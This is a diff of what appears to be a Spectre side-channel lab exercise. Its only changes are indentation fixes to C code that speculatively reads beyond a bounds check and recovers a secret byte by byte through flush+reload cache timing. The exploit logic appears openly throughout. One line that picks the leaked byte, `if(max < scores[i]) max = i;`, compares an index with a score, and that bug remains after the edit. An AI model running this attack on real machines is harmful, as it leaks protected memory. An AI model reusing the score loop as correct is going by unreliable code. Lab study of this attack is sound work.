@@ -371,7 +371,6 @@ In this task, we want to print the entire secret string. For that, simply keep e
 #include <unistd.h>
 #include <string.h>
 
-
 unsigned int bound_lower = 0;
 unsigned int bound_upper = 9;
 uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9}; 
@@ -386,9 +385,9 @@ uint8_t array[256*4096];
 uint8_t restrictedAccess(size_t x)
 {
   if (x <= bound_upper && x >= bound_lower) {
-     return buffer[x];
+    return buffer[x];
   } else {
-     return 0;
+    return 0;
   }
 }
 
@@ -404,7 +403,7 @@ void flushSideChannel()
 static int scores[256];
 void reloadSideChannelImproved()
 {
-int i;
+  int i;
   volatile uint8_t *addr;
   register uint64_t time1, time2;
   int junk = 0;
@@ -455,16 +454,16 @@ int main() {
     for(i=0;i<256; i++) scores[i]=0; 
 
     for (i = 0; i < 1000; i++) {
-        printf("*****\n");  // This seemly "useless" line is necessary for the attack to succeed
-        spectreAttack(index_beyond + k);
-        usleep(10);
-        reloadSideChannelImproved();
+      printf("*****\n");  // This seemly "useless" line is necessary for the attack to succeed
+      spectreAttack(index_beyond + k);
+      usleep(10);
+      reloadSideChannelImproved();
     }
 
     int max = 1;
     for (i = 1; i < 256; i++) {
-        if(max < scores[i])
-            max = i;
+      if(max < scores[i])
+        max = i;
     }
 
     size_t idx = strlen(spectre_secret);
